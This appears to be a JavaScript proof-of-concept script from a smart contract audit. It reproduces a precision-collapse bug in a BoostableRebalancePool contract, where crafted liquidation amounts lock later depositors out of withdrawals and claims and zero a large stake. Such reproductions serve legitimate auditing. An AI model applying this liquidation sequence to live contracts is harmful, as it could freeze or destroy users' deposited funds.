// H4: K4 magnitude collapse (DFP.mul exponent branch L16669-L16671) reached through BoostableRebalancePool._notifyLoss,
// and O4d with a denormal snapshot (two small liquidations zero a ~unchanged stake, L16445-L16461).
const { ethers, E18, DAY, advance, tx, view, prod, setupPool } = require("./lib");

async function cur(pool) {
  return (await pool.totalSupplyHistory((await pool.numTotalSupplyHistory()) - 1n)).product;
}

async function main() {
  console.log("== Part 1: mag -> 0 after three liquidations; later depositors are locked ==");
  const fx = await setupPool("Boostable");
  const { A, B, C, D, liq, dist, base, fxn, pool } = fx;
  await tx("A.deposit(1e18)", pool.connect(A).deposit(E18, A.address));
  await tx("liquidate(1e18 - 1e9 - 1)", pool.connect(liq).liquidate(E18 - 10n ** 9n - 1n, 0));
  console.log("  product", prod(await cur(pool)), "S =", (await pool.totalSupply()).toString());
  await tx("B.deposit(to S = 1e18)", pool.connect(B).deposit(E18 - (await pool.totalSupply()), B.address));
  await tx("liquidate(1e18 - 1)", pool.connect(liq).liquidate(E18 - 1n, 0));
  console.log("  product", prod(await cur(pool)), "S =", (await pool.totalSupply()).toString());
  await tx("C.deposit(to S = 1e18)", pool.connect(C).deposit(E18 - (await pool.totalSupply()), C.address));
  await tx("liquidate(1e18 - 1e9 + 1)", pool.connect(liq).liquidate(E18 - 10n ** 9n + 1n, 0));
  console.log("  product", prod(await cur(pool)), "S =", (await pool.totalSupply()).toString());
  await tx("D.deposit(5e18)", pool.connect(D).deposit(5n * E18, D.address));
  await tx("dist.depositReward(FXN, 700e18)", pool.connect(dist).depositReward(await fxn.getAddress(), 700n * E18));
  await advance(DAY);
  await view("balanceOf(D)", pool.balanceOf(D.address));
  await view("claimable(D, base)", pool.claimable(D.address, await base.getAddress()));
  await tx("D.withdraw(5e18)", pool.connect(D).withdraw(5n * E18, D.address));
  await tx("D.claim()", pool.connect(D)["claim()"]());
  await tx("liquidate(max) - full wipe, new epoch", pool.connect(liq).liquidate(ethers.MaxUint256, 0));
  console.log("  product", prod(await cur(pool)));
  await advance(DAY);
  await tx("D.claim() in the new epoch", pool.connect(D)["claim()"]());
  await tx("D.deposit(1e18) in the new epoch", pool.connect(D).deposit(E18, D.address));

  console.log("\n== Part 2: denormal snapshot (exp 1, mag 1); two 1-token liquidations zero a 1e6-token stake ==");
  const g = await setupPool("Boostable");
  await tx("A.deposit(1e18)", g.pool.connect(g.A).deposit(E18, g.A.address));
  await tx("liquidate(1e18 - 1e9 - 1)", g.pool.connect(g.liq).liquidate(E18 - 10n ** 9n - 1n, 0));
  await tx("B.deposit(to S = 1e18)", g.pool.connect(g.B).deposit(E18 - (await g.pool.totalSupply()), g.B.address));
  await tx("liquidate(1e18 - 1)", g.pool.connect(g.liq).liquidate(E18 - 1n, 0));
  console.log("  product", prod(await cur(g.pool)), "S =", (await g.pool.totalSupply()).toString());
  await tx("U(C).deposit(1e24)", g.pool.connect(g.C).deposit(10n ** 24n, g.C.address));
  for (let k = 0; k < 2; k++) {
    await tx("liquidate(1e18)", g.pool.connect(g.liq).liquidate(E18, 0));
    console.log("  product", prod(await cur(g.pool)), " balanceOf(U) =", (await g.pool.balanceOf(g.C.address)).toString(),
      " totalSupply =", (await g.pool.totalSupply()).toString());
  }
  await tx("U.withdraw(max)", g.pool.connect(g.C).withdraw(ethers.MaxUint256, g.C.address));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
